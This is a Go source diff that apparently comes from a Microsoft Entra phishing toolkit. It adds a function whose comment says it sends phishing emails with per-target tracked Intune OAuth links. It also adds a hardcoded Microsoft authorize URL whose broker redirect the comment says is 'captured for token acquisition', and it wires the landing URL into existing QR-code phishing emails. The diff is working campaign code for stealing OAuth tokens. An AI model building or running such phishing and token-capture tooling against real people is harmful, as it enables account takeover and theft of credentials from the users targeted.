@@ -12,11 +12,11 @@ import (
 	"sync"
 	"time"
 
-	qrcode "github.com/skip2/go-qrcode"
 	"github.com/bl4cksku11/entraith/internal/mailer"
 	"github.com/bl4cksku11/entraith/internal/modules/devicecode"
 	"github.com/bl4cksku11/entraith/internal/store"
 	"github.com/bl4cksku11/entraith/internal/targets"
+	qrcode "github.com/skip2/go-qrcode"
 )
 
 type CampaignStatus int
@@ -294,8 +294,8 @@ func (m *Manager) GetCampaign(id string) (*Campaign, bool) {
 	return c, ok
 }
 
-func (m *Manager) ClientID() string  { return m.clientID }
-func (m *Manager) TenantID() string  { return m.tenantID }
+func (m *Manager) ClientID() string { return m.clientID }
+func (m *Manager) TenantID() string { return m.tenantID }
 
 func (m *Manager) AllCampaigns() []*Campaign {
 	m.mu.RLock()
@@ -978,6 +978,7 @@ func (m *Manager) SendQREmails(campaignID string, profile *mailer.SenderProfile,
 		data := mailer.TemplateData{
 			TargetEmail: t.Email,
 			TargetName:  t.DisplayName,
+			RealURL:     scanURL,
 			QRCode:      qrImgTag,
 		}
 		err = mailer.Send(profile, qrTmpl, data)
@@ -1024,4 +1025,83 @@ func newToken() string {
 	b := make([]byte, 16)
 	rand.Read(b)
 	return fmt.Sprintf("%x", b)
+}
+
+// IntuneOAuthURL is the Microsoft OAuth authorization URL for Intune device registration.
+// This URL triggers the AAD Broker redirect which we capture for token acquisition.
+const IntuneOAuthURL = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9ba1a5c7-f17a-4de9-a1f1-6178c8d51223&redirect_uri=ms-appx-web%3A%2F%2FMicrosoft.AAD.BrokerPlugin%2FS-1-15-2-2666988183-1750391847-2906264630-3525785777-2857982319-3063633125-1907478113&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default"
+
+// SendIntuneEmails sends phishing emails with Intune OAuth links.
+// Each target gets a unique token that tracks when they visit the landing page.
+func (m *Manager) SendIntuneEmails(campaignID string, profile *mailer.SenderProfile, intuneTmpl *mailer.EmailTemplate, baseURL, filterTargetID string) ([]*mailer.EmailSendResult, error) {
+	c, ok := m.GetCampaign(campaignID)
+	if !ok {
+		return nil, fmt.Errorf("campaign not found")
+	}
+
+	allTargets := c.Targets.All()
+	if len(allTargets) == 0 {
+		return nil, fmt.Errorf("no targets in campaign")
+	}
+
+	if filterTargetID != "" {
+		filtered := allTargets[:0]
+		for _, t := range allTargets {
+			if t.ID == filterTargetID {
+				filtered = append(filtered, t)
+				break
+			}
+		}
+		if len(filtered) == 0 {
+			return nil, fmt.Errorf("target %s not found in campaign", filterTargetID)
+		}
+		allTargets = filtered
+	}
+
+	results := make([]*mailer.EmailSendResult, 0, len(allTargets))
+	now := time.Now().UTC()
+
+	for _, t := range allTargets {
+		token := newToken()
+		intuneURL := strings.TrimRight(baseURL, "/") + "/intune/" + token
+
+		m.db.UpsertIntuneToken(store.IntuneTokenRow{
+			Token:       token,
+			CampaignID:  campaignID,
+			TargetID:    t.ID,
+			TargetEmail: t.Email,
+			CreatedAt:   now,
+		})
+
+		data := mailer.TemplateData{
+			TargetEmail: t.Email,
+			TargetName:  t.DisplayName,
+			RealURL:     intuneURL,
+		}
+		err := mailer.Send(profile, intuneTmpl, data)
+		res := &mailer.EmailSendResult{
+			TargetID:    t.ID,
+			TargetEmail: t.Email,
+			SentAt:      now,
+			Success:     err == nil,
+		}
+		if err != nil {
+			res.Error = err.Error()
+		}
+		m.db.InsertEmailResult(store.EmailResultRow{
+			CampaignID:  campaignID,
+			TargetID:    res.TargetID,
+			TargetEmail: res.TargetEmail,
+			SentAt:      res.SentAt,
+			Success:     res.Success,
+			Error:       res.Error,
+		})
+		results = append(results, res)
+	}
+
+	c.mu.Lock()
+	c.EmailResults = append(c.EmailResults, results...)
+	c.mu.Unlock()
+	m.saveCampaign(c)
+	return results, nil
 }
